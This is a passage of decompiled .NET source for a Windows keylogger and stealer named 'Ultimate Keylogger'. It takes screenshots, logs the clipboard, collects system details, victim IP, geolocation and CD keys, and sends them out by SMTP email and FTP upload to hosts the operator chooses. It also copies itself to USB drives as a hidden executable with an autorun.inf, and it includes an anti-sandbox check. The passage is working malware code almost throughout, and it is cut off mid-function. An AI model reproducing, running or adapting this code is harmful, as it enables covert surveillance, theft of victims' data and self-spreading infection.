      bitmap.Save(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + this.Label35.Text + ".jpeg");
      Label label35 = this.Label35;
      label35.Text = Conversions.ToString(Conversions.ToDouble(label35.Text) + 1.0);
      MailMessage message = new MailMessage();
      message.From = new MailAddress(this.TextBox2.Text);
      message.To.Add(this.TextBox4.Text);
      message.Subject = "Ultimate Logger" + MyProject.Computer.Name.ToString() + "At " + Conversions.ToString(MyProject.Computer.Clock.LocalTime);
      message.Body = "ComputerInformation" + this.nl + this.nl + this.TextBox16.Text + this.nl + this.nl + "Installed Software" + this.nl + this.nl + this.TextBox11.Text + this.nl + this.nl + "Logs" + this.nl + this.nl + this.TextBox1.Text + this.nl + this.nl + "ClipBoard" + this.nl + this.clip + this.nl + this.nl + this.totalfuckshit;
      Attachment attachment1 = new Attachment(this.Label36.Text);
      message.Attachments.Add(attachment1);
      Attachment attachment2 = new Attachment(this.attact_fuck);
      message.Attachments.Add(attachment2);
      new SmtpClient(this.Label4.Text)
      {
        Port = Conversions.ToInteger(this.Label5.Text),
        Credentials = ((ICredentialsByHost) new NetworkCredential(this.TextBox2.Text, this.TextBox3.Text)),
        EnableSsl = true
      }.Send(message);
      this.TextBox1.Clear();
    }

    public void logscrennclip()
    {
      this.Label37.Text = "Logs+Clipboardlogger+screenlogger";
      this.Label36.Text = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + this.Label35.Text + ".jpeg";
      Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Bitmap bitmap = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
      bitmap.Save(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + this.Label35.Text + ".jpeg");
      Label label35 = this.Label35;
      label35.Text = Conversions.ToString(Conversions.ToDouble(label35.Text) + 1.0);
      MailMessage message = new MailMessage();
      message.From = new MailAddress(this.TextBox2.Text);
      message.To.Add(this.TextBox4.Text);
      message.Subject = "Ultimate Keylogger" + MyProject.Computer.Name.ToString() + "At " + Conversions.ToString(MyProject.Computer.Clock.LocalTime);
      message.Body = "ComputerInformation" + this.nl + this.nl + this.TextBox16.Text + this.nl + this.nl + "Installed Software" + this.nl + this.nl + this.TextBox11.Text + this.nl + this.nl + "Logs" + this.nl + this.nl + this.TextBox1.Text + this.nl + this.nl + "ClipBoard Logs" + this.nl + this.clip + this.nl + this.nl + this.nl + this.totalfuckshit;
      Attachment attachment1 = new Attachment(this.Label36.Text);
      message.Attachments.Add(attachment1);
      Attachment attachment2 = new Attachment(this.attact_fuck);
      message.Attachments.Add(attachment2);
      new SmtpClient(this.Label4.Text)
      {
        Port = Conversions.ToInteger(this.Label5.Text),
        Credentials = ((ICredentialsByHost) new NetworkCredential(this.TextBox2.Text, this.TextBox3.Text)),
        EnableSsl = true
      }.Send(message);
      this.TextBox1.Clear();
    }

    public void makedir()
    {
      string str = "ftp://" + this.TextBox4.Text;
      string text1 = this.TextBox2.Text;
      string text2 = this.TextBox3.Text;
      string text3 = this.Label3.Text;
      FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(str + "/" + text3);
      ftpWebRequest.Method = "MKD";
      ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(text1, text2);
      ftpWebRequest.GetResponse();
    }

    public void Fpt_Fuck_AllInOne_Upload()
    {
      this.ftp_upload_NewxFuck = this.dpath + "\\Ultimate Keylogger " + this.ftp_increment + "  On " + MyProject.Computer.Name + " 's ComputerAt" + this.datenow + ".txt";
      this.Label37.Text = "Ftp Count :  " + this.ftp_increment;
      string str1 = "";
      string str2 = "";
      StreamWriter streamWriter = new StreamWriter(this.dpath + "\\Ultimate Keylogger " + this.ftp_increment + "  On " + MyProject.Computer.Name + " 's ComputerAt" + this.datenow + ".txt", true);
      streamWriter.Write("    Ultimate Keylogger " + MyProject.Computer.Name + " 's Computer At " + this.datenow + this.nl + str1 + this.nl + str2 + this.nl + this.nl + "ComputerInformation" + this.nl + this.nl + this.TextBox16.Text + this.nl + this.nl + "Installed" + this.nl + this.nl + this.TextBox11.Text + this.nl + this.nl + "+------    logs    -------+ " + this.nl + this.nl + this.TextBox1.Text + this.nl + this.nl + "ClipBoard Logs" + this.nl + this.clip + this.nl + this.nl + this.TextBox12.Text + this.nl + this.nl + "Cd Keys" + this.nl + this.nl + this.TextBox9.Text);
      streamWriter.Close();
      this.TextBox1.Clear();
      string text1 = this.TextBox2.Text;
      string text2 = this.TextBox3.Text;
      FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create("ftp://" + this.TextBox4.Text + "/" + this.Label3.Text + "/Ultimate Keylogger " + MyProject.Computer.Name + " 's Computer " + this.datenow + " Log " + this.ftp_increment + ".txt");
      ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(text1, text2);
      ftpWebRequest.Method = "STOR";
      byte[] buffer = System.IO.File.ReadAllBytes(this.ftp_upload_NewxFuck);
      Stream requestStream = ftpWebRequest.GetRequestStream();
      requestStream.Write(buffer, 0, buffer.Length);
      requestStream.Close();
      requestStream.Dispose();
      this.TextBox1.Clear();
      this.ftp_increment = Conversions.ToString(Conversions.ToDouble(this.ftp_increment) + 1.0);
    }

    public void screen1()
    {
      this.Label37.Text = "screeshot " + this.Label35.Text;
      this.Label36.Text = this.dpath + "\\ScreenShot " + this.Label35.Text + " On " + MyProject.Computer.Name + " 's Computer " + this.datenow + ".jpeg";
      Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Bitmap bitmap = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
      bitmap.Save(this.Label36.Text);
      this.Label40.Text = this.Label36.Text;
      Thread.Sleep(1000);
      this.Label37.Text = "_______________Uploadding image";
      string text1 = this.TextBox2.Text;
      string text2 = this.TextBox3.Text;
      FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create("ftp://" + this.TextBox4.Text + "/" + this.Label3.Text + "/Screenlogger On " + MyProject.Computer.Name + "At" + this.datenow + "Screenshot  " + this.Label35.Text + " .jpeg");
      ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(text1, text2);
      ftpWebRequest.Method = "STOR";
      byte[] buffer = System.IO.File.ReadAllBytes(this.Label36.Text);
      Stream requestStream = ftpWebRequest.GetRequestStream();
      requestStream.Write(buffer, 0, buffer.Length);
      requestStream.Close();
      requestStream.Dispose();
      Label label35 = this.Label35;
      label35.Text = Conversions.ToString(Conversions.ToDouble(label35.Text) + 1.0);
      this.del2();
    }

    public void del2()
    {
      if (!System.IO.File.Exists(this.Label36.Text))
        return;
      System.IO.File.Delete(this.Label36.Text);
    }

    public void del_Cdtot()
    {
      if (!System.IO.File.Exists(this.dpath + "\\cdkeys.txt"))
        return;
      System.IO.File.Delete(this.dpath + "\\cdkeys.txt");
    }

    public void cd_keytxt_Create()
    {
      this.del_Cdtot();
      StreamWriter streamWriter = new StreamWriter(this.dpath + "\\cdkeys.txt", true);
      streamWriter.Write(FuckTheKey.fuckkeys());
      streamWriter.Close();
    }

    private void Timer2_Tick(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.clip, MyProject.Computer.Clipboard.GetText(), false) == 0)
        return;
      if (Conversions.ToDouble(this.lblNumb.Text) != 0.0)
      {
        this.lblNumb.Text = Conversions.ToString(Conversions.ToDouble(this.lblNumb.Text) + 1.0);
        this.TextBox17.Text = this.TextBox17.Text + "\r\n\r\nLog " + this.lblNumb.Text + " - " + MyProject.Computer.Clipboard.GetText();
        this.clip = MyProject.Computer.Clipboard.GetText();
      }
      else
      {
        this.lblNumb.Text = Conversions.ToString(Conversions.ToDouble(this.lblNumb.Text) + 1.0);
        this.TextBox17.Text = this.TextBox17.Text + "Log " + this.lblNumb.Text + " - " + MyProject.Computer.Clipboard.GetText();
        this.clip = MyProject.Computer.Clipboard.GetText();
      }
    }

    private void Timer3_Tick(object sender, EventArgs e)
    {
      this.Label41.Text = "Timer 3 :-----------Started";
      if (Operators.CompareString(this.Label19.Text, "screenlogger-no", false) == 0 & Operators.CompareString(this.Label30.Text, "clipboardlogger-no", false) == 0 & Operators.CompareString(this.Label20.Text, "stealers-no", false) == 0)
      {
        try
        {
          this.Label41.Text = "Timer 3 :----------Logs";
          this.totalfuckshit = "Stealers Not Selected";
          this.clip = "";
          this.logs();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          this.Label41.Text = "Timer 3 :----------Logs";
          this.totalfuckshit = "";
          this.clip = "";
          this.logs();
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(this.Label19.Text, "screenlogger-no", false) == 0 & Operators.CompareString(this.Label30.Text, "clipboardlogger-no", false) == 0 & Operators.CompareString(this.Label20.Text, "stealers-Ys", false) == 0)
      {
        try
        {
          this.Label41.Text = "Timer 3 :-----------Logs+Stealers";
          this.clip = "";
          this.clipboarlogs();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          this.Label41.Text = "Timer 3 :-----------Logs+Stealers";
          this.clip = " ";
          this.clipboarlogs();
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(this.Label19.Text, "screenlogger-no", false) == 0 & Operators.CompareString(this.Label30.Text, "clipboardlogger-Ys", false) == 0 & Operators.CompareString(this.Label20.Text, "stealers-Ys", false) == 0)
      {
        try
        {
          this.Label41.Text = "Timer 3 :-----------clip+stealers";
          this.clipboarlogs();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          this.Label41.Text = "Timer 3 :-----------clip+stealers";
          this.clipboarlogs();
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(this.Label19.Text, "screenlogger-Ys", false) == 0 & Operators.CompareString(this.Label30.Text, "clipboardlogger-Ys", false) == 0 & Operators.CompareString(this.Label20.Text, "stealers-Ys", false) == 0)
      {
        try
        {
          this.Label41.Text = "+--------Screen_Ys + Cli_Ys+_Steera_Ys";
          this.logscrennclip();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          this.Label41.Text = "+--------Screen_Ys + Cli_Ys+_Steera_Ys";
          this.logscrennclip();
          ProjectData.ClearProjectError();
        }
      }
      if (!(Operators.CompareString(this.Label19.Text, "screenlogger-Ys", false) == 0 & Operators.CompareString(this.Label30.Text, "clipboardlogger-no", false) == 0 & Operators.CompareString(this.Label20.Text, "stealers-Ys", false) == 0))
        return;
      try
      {
        this.Label41.Text = "+--------Screen_Ys + Cli_No+_Steera_Ys";
        this.clip = "";
        this.logscrennclip();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.Label41.Text = "+--------Screen_Ys + Cli_No+_Steera_Ys";
        this.clip = "";
        this.logscrennclip();
        ProjectData.ClearProjectError();
      }
    }

    private virtual ManagementEventWatcher m_MediaConnectWatcher
    {
      get => this._m_MediaConnectWatcher;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventArrivedEventHandler arrivedEventHandler = new EventArrivedEventHandler(this.Arrived);
        if (this._m_MediaConnectWatcher != null)
          this._m_MediaConnectWatcher.EventArrived -= arrivedEventHandler;
        this._m_MediaConnectWatcher = value;
        if (this._m_MediaConnectWatcher == null)
          return;
        this._m_MediaConnectWatcher.EventArrived += arrivedEventHandler;
      }
    }

    public void StartDetection()
    {
      this.m_MediaConnectWatcher = new ManagementEventWatcher("SELECT * FROM __InstanceOperationEvent WITHIN 10 WHERE TargetInstance ISA \"Win32_DiskDrive\"");
      this.m_MediaConnectWatcher.Start();
    }

    private void Arrived(object sender, EventArrivedEventArgs e)
    {
      ManagementBaseObject newEvent = e.NewEvent;
      ManagementBaseObject managementBaseObject = (ManagementBaseObject) newEvent["TargetInstance"];
      if (Operators.CompareString(newEvent.ClassPath.ClassName, "__InstanceCreationEvent", false) != 0)
        return;
      if (Operators.ConditionalCompareObjectEqual(managementBaseObject["InterfaceType"], (object) "USB", false))
      {
        this.details = this.GetDriveLetterFromDisk(Conversions.ToString(managementBaseObject["Name"]));
        try
        {
          MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, this.details + "Sys.exe");
          FileSystem.FileOpen(1, this.details + "autorun.inf", OpenMode.Binary);
          FileSystem.FilePut(1, "[autorun]\r\nshellexecute=sys.exe", -1L, false);
          FileSystem.FileClose(1);
          MyProject.Computer.FileSystem.GetFileInfo(this.details + "Sys.exe").Attributes = FileAttributes.Hidden | FileAttributes.System;
          MyProject.Computer.FileSystem.GetFileInfo(this.details + "autorun.inf").Attributes = FileAttributes.Hidden | FileAttributes.System;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else
      {
        int num = (int) Interaction.MsgBox(RuntimeHelpers.GetObjectValue(managementBaseObject["InterfaceType"]));
      }
    }

    private string GetDriveLetterFromDisk(string Name)
    {
      Name = Microsoft.VisualBasic.Strings.Replace(Name, "\\", "\\\\");
      ManagementObjectSearcher managementObjectSearcher1 = new ManagementObjectSearcher(new ObjectQuery("ASSOCIATORS OF {Win32_DiskDrive.DeviceID=\"" + Name + "\"} WHERE AssocClass = Win32_DiskDriveToDiskPartition"));
      try
      {
        foreach (ManagementBaseObject managementBaseObject1 in managementObjectSearcher1.Get())
        {
          ManagementObjectSearcher managementObjectSearcher2 = new ManagementObjectSearcher(new ObjectQuery(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "ASSOCIATORS OF {Win32_DiskPartition.DeviceID=\"", managementBaseObject1["DeviceID"]), (object) "\"} WHERE AssocClass = Win32_LogicalDiskToPartition"))));
          try
          {
            foreach (ManagementBaseObject managementBaseObject2 in managementObjectSearcher2.Get())
              this.ans = Conversions.ToString(Operators.ConcatenateObject((object) this.ans, Operators.ConcatenateObject(managementBaseObject2[nameof (Name)], (object) ",")));
          }
          finally
          {
            ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
            objectEnumerator?.Dispose();
          }
        }
      }
      finally
      {
        ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
        objectEnumerator?.Dispose();
      }
      return this.ans.Trim(',');
    }

    public void cp_information()
    {
label_0:
      int num1;
      int num2;
      try
      {
        int num3 = 1;
        this.m_LM = Registry.LocalMachine;
label_1:
        num3 = 2;
        this.m_HW = this.m_LM.OpenSubKey("HARDWARE");
label_2:
        num3 = 3;
        this.m_Des = this.m_HW.OpenSubKey("DESCRIPTION");
label_3:
        num3 = 4;
        this.m_System = this.m_Des.OpenSubKey("SYSTEM");
label_4:
        num3 = 5;
        this.m_CPU = this.m_System.OpenSubKey("CentralProcessor");
label_5:
        num3 = 6;
        this.m_Info = this.m_CPU.OpenSubKey("0");
label_6:
        ProjectData.ClearProjectError();
        num1 = 1;
label_7:
        num3 = 8;
        this.manufactor();
label_8:
        ProjectData.ClearProjectError();
        num1 = 1;
label_9:
        num3 = 10;
        this.mo_board();
label_10:
        ProjectData.ClearProjectError();
        num1 = 1;
label_11:
        num3 = 12;
        this.getip();
label_12:
        ProjectData.ClearProjectError();
        num1 = 1;
label_13:
        num3 = 14;
        this.callx();
label_14:
        num3 = 15;
        this.total_Fuck_CpInformtion = "Computer Name                : " + MyProject.Computer.Name;
label_15:
        num3 = 16;
        this.total_Fuck_CpInformtion = this.total_Fuck_CpInformtion + Environment.NewLine + "Computer Os                  : " + MyProject.Computer.Info.OSFullName.ToString();
label_16:
        num3 = 17;
        this.total_Fuck_CpInformtion = this.total_Fuck_CpInformtion + Environment.NewLine + ".Net Run Time                : " + Environment.Version.ToString();
label_17:
        num3 = 18;
        this.total_Fuck_CpInformtion = this.total_Fuck_CpInformtion + Environment.NewLine + "Os Manufacturer              : " + this.os_manu;
label_18:
        num3 = 19;
        this.total_Fuck_CpInformtion = this.total_Fuck_CpInformtion + Environment.NewLine + "Total Physical Memory        : " + Conversions.ToString(MyProject.Computer.Info.TotalPhysicalMemory);
label_19:
        num3 = 20;
        this.total_Fuck_CpInformtion = this.total_Fuck_CpInformtion + Environment.NewLine + "Mother Board ManFactor       : " + this.motherbo_name;
label_20:
        num3 = 21;
        this.total_Fuck_CpInformtion = this.total_Fuck_CpInformtion + Environment.NewLine + "Mother Board Serial Key      : " + this.motherbo_serial;
label_21:
        num3 = 22;
        this.total_Fuck_CpInformtion = Conversions.ToString(Operators.ConcatenateObject((object) (this.total_Fuck_CpInformtion + Environment.NewLine + "Computer Processor           : "), this.m_Info.GetValue("VendorIdentifier")));
label_22:
        num3 = 23;
        this.total_Fuck_CpInformtion = Conversions.ToString(Operators.ConcatenateObject((object) (this.total_Fuck_CpInformtion + Environment.NewLine + "                              "), this.m_Info.GetValue("ProcessorNameString")));
label_23:
        num3 = 24;
        this.total_Fuck_CpInformtion = this.total_Fuck_CpInformtion + Environment.NewLine + "Victims IP Address           : " + this.Cp_ip;
label_24:
        ProjectData.ClearProjectError();
        num1 = 1;
label_25:
        num3 = 26;
        this.TextBox15.Text = this.total_Fuck_CpInformtion;
label_26:
        num3 = 27;
        this.TextBox16.Text = this.TextBox15.Text + this.nl + this.TextBox14.Text;
label_27:
        num3 = 28;
        this.Installed_Soft();
        goto label_34;
label_29:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
                goto label_16;
              case 18:
                goto label_17;
              case 19:
                goto label_18;
              case 20:
                goto label_19;
              case 21:
                goto label_20;
              case 22:
                goto label_21;
              case 23:
                goto label_22;
              case 24:
                goto label_23;
              case 25:
                goto label_24;
              case 26:
                goto label_25;
              case 27:
                goto label_26;
              case 28:
                goto label_27;
              case 29:
                goto label_34;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_29;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_34:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void Installed_Soft()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall", false);
label_2:
        num3 = 3;
        string[] subKeyNames = registryKey1.GetSubKeyNames();
        int index = 0;
        goto label_11;
label_4:
        num3 = 4;
        string str1;
        RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\" + str1, false);
label_5:
        num3 = 5;
        if (!((IEnumerable<string>) registryKey2.GetValueNames()).Contains<string>("DisplayName"))
          goto label_9;
label_6:
        num3 = 6;
        string str2 = Conversions.ToString(registryKey2.GetValue("DisplayName"));
label_7:
        num3 = 7;
        if (this.ListBox1.Items.Contains((object) str2))
          goto label_9;
label_8:
        num3 = 8;
        this.ListBox1.Items.Add((object) str2);
label_9:
        checked { ++index; }
label_10:
        num3 = 11;
label_11:
        if (index < subKeyNames.Length)
        {
          str1 = subKeyNames[index];
          goto label_4;
        }
label_12:
        num3 = 12;
        IEnumerator enumerator = this.ListBox1.Items.GetEnumerator();
        goto label_16;
label_14:
        num3 = 13;
        TextBox textBox11 = this.TextBox11;
        string str3;
        textBox11.Text = textBox11.Text + Environment.NewLine + str3;
label_15:
        num3 = 14;
label_16:
        if (enumerator.MoveNext())
        {
          str3 = Conversions.ToString(enumerator.Current);
          goto label_14;
        }
        else if (enumerator is IDisposable)
        {
          (enumerator as IDisposable).Dispose();
          goto label_25;
        }
        else
          goto label_25;
label_20:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_6;
              case 7:
                goto label_7;
              case 8:
                goto label_8;
              case 9:
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_12;
              case 13:
                goto label_14;
              case 14:
                goto label_15;
              case 15:
                goto label_25;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_20;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_25:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void mo_board()
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard");
      try
      {
        foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
        {
          this.motherbo_name = managementBaseObject["Manufacturer"].ToString();
          this.motherbo_product = managementBaseObject["Product"].ToString();
          this.motherbo_serial = managementBaseObject["SerialNumber"].ToString();
        }
      }
      finally
      {
        ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
        objectEnumerator?.Dispose();
      }
    }

    public void manufactor()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
label_2:
        num3 = 3;
        ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator();
        goto label_6;
label_4:
        num3 = 4;
        ManagementObject current;
        this.os_manu = current["Manufacturer"].ToString();
label_5:
        num3 = 5;
label_6:
        if (enumerator.MoveNext())
        {
          current = (ManagementObject) enumerator.Current;
          goto label_4;
        }
        else if (enumerator != null)
        {
          enumerator.Dispose();
          goto label_15;
        }
        else
          goto label_15;
label_10:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_15;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_10;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_15:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void getip()
    {
      using (WebClient webClient = new WebClient())
      {
        try
        {
          this.Cp_ip = webClient.DownloadString("http://whatismyip.com/automation/n09230945.asp");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    private void Timer5_Tick(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.Label19.Text, "screenlogger-no", false) == 0 & Operators.CompareString(this.Label30.Text, "clipboardlogger-no", false) == 0 & Operators.CompareString(this.Label20.Text, "stealers-no", false) == 0)
      {
        try
        {
          this.clip = "+-------- You Dont Select ClipBoard Logger ";
          this.totalfuckshit = "+-------- You Dont Select Stealers ------------ + ";
          this.Fpt_Fuck_AllInOne_Upload();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          this.clip = "+-------- You Dont Select ClipBoard Logger ";
          this.totalfuckshit = "+-------- You Dont Select Stealers ------------ + ";
          this.Fpt_Fuck_AllInOne_Upload();
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(this.Label19.Text, "screenlogger-no", false) == 0 & Operators.CompareString(this.Label30.Text, "clipboardlogger-no", false) == 0 & Operators.CompareString(this.Label20.Text, "stealers-Ys", false) == 0)
      {
        try
        {
          this.clip = "+-------- You Dont Select ClipBoard Logger ";
          this.Fpt_Fuck_AllInOne_Upload();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          this.clip = "+-------- You Dont Select ClipBoard Logger ";
          this.Fpt_Fuck_AllInOne_Upload();
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(this.Label19.Text, "screenlogger-no", false) == 0 & Operators.CompareString(this.Label30.Text, "clipboardlogger-Ys", false) == 0 & Operators.CompareString(this.Label20.Text, "stealers-Ys", false) == 0)
      {
        try
        {
          this.Fpt_Fuck_AllInOne_Upload();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          this.Fpt_Fuck_AllInOne_Upload();
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(this.Label19.Text, "screenlogger-Ys", false) == 0 & Operators.CompareString(this.Label30.Text, "clipboardlogger-Ys", false) == 0 & Operators.CompareString(this.Label20.Text, "stealers-Ys", false) == 0)
      {
        try
        {
          this.Fpt_Fuck_AllInOne_Upload();
          this.screen1();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          this.Fpt_Fuck_AllInOne_Upload();
          this.screen1();
          ProjectData.ClearProjectError();
        }
      }
      if (!(Operators.CompareString(this.Label19.Text, "screenlogger-Ys", false) == 0 & Operators.CompareString(this.Label30.Text, "clipboardlogger-no", false) == 0 & Operators.CompareString(this.Label20.Text, "stealers-Ys", false) == 0))
        return;
      try
      {
        this.clip = "+-------- You Dont Select ClipBoard Logger ";
        this.Fpt_Fuck_AllInOne_Upload();
        this.screen1();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.clip = "+-------- You Dont Select ClipBoard Logger ";
        this.Fpt_Fuck_AllInOne_Upload();
        this.screen1();
        ProjectData.ClearProjectError();
      }
    }

    public static string RC4(string message, string password)
    {
      int index1 = 0;
      int index2 = 0;
      StringBuilder stringBuilder = new StringBuilder();
      string empty = string.Empty;
      int[] numArray1 = new int[257];
      int[] numArray2 = new int[257];
      int length = password.Length;
      int location1 = 0;
      while (location1 <= (int) byte.MaxValue)
      {
        char String = password.Substring(location1 % length, 1).ToCharArray()[0];
        numArray2[location1] = Microsoft.VisualBasic.Strings.Asc(String);
        numArray1[location1] = location1;
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      int index3 = 0;
      int location2 = 0;
      while (location2 <= (int) byte.MaxValue)
      {
        index3 = checked (index3 + numArray1[location2] + numArray2[location2]) % 256;
        int num = numArray1[location2];
        numArray1[location2] = numArray1[index3];
        numArray1[index3] = num;
        Math.Max(Interlocked.Increment(ref location2), checked (location2 - 1));
      }
      location1 = 1;
      while (location1 <= message.Length)
      {
        index1 = checked (index1 + 1) % 256;
        index2 = checked (index2 + numArray1[index1]) % 256;
        int num1 = numArray1[index1];
        numArray1[index1] = numArray1[index2];
        numArray1[index2] = num1;
        int num2 = numArray1[checked (numArray1[index1] + numArray1[index2]) % 256];
        int CharCode = Microsoft.VisualBasic.Strings.Asc(message.Substring(checked (location1 - 1), 1).ToCharArray()[0]) ^ num2;
        stringBuilder.Append(Microsoft.VisualBasic.Strings.Chr(CharCode));
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      string str = stringBuilder.ToString();
      stringBuilder.Length = 0;
      return str;
    }

    public void antisandboxie()
    {
      if (!this.Text.Contains("#"))
        return;
      ProjectData.EndApp();
    }

    private void Timer4_Tick(object sender, EventArgs e)
    {
    }

    private void Timer7_Tick(object sender, EventArgs e)
    {
    }

    public void callx()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        XPathDocument xpathDocument = new XPathDocument("http://ip-address.domaintools.com/myip.xml");
label_2:
        num3 = 3;
        XPathNavigator navigator = xpathDocument.CreateNavigator();
label_3:
        num3 = 4;
        XPathExpression expr = navigator.Compile("//ip_address");
label_4:
        num3 = 5;
        XPathNodeIterator xpathNodeIterator = navigator.Select(expr);
label_5:
        num3 = 6;
        xpathNodeIterator = navigator.Select("//country");
        goto label_7;
label_6:
        num3 = 9;
        this.TextBox14.Text = this.TextBox14.Text + "Country                      : " + xpathNodeIterator.Current.Value + this.nl;
label_7:
        num3 = 8;
        if (xpathNodeIterator.MoveNext())
          goto label_6;
label_8:
        num3 = 11;
        xpathNodeIterator = navigator.Select("//region");
        goto label_10;
label_9:
        num3 = 14;
        this.TextBox14.Text = this.TextBox14.Text + "Region                       : " + xpathNodeIterator.Current.Value + this.nl;
label_10:
        num3 = 13;
        if (xpathNodeIterator.MoveNext())
          goto label_9;
label_11:
        num3 = 16;
        xpathNodeIterator = navigator.Select("//isp");
        goto label_13;
label_12:
        num3 = 19;
        this.TextBox14.Text = this.TextBox14.Text + "Isp                             : " + xpathNodeIterator.Current.Value + this.nl;
label_13:
        num3 = 18;
        if (xpathNodeIterator.MoveNext())
          goto label_12;
label_14:
        num3 = 21;
        xpathNodeIterator = navigator.Select("//city");
        goto label_16;
label_15:
        num3 = 24;
        this.TextBox14.Text = this.TextBox14.Text + "City                            : " + xpathNodeIterator.Current.Value + this.nl;
label_16:
        num3 = 23;
        if (xpathNodeIterator.MoveNext())
          goto label_15;
        else
          goto label_23;
label_18:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
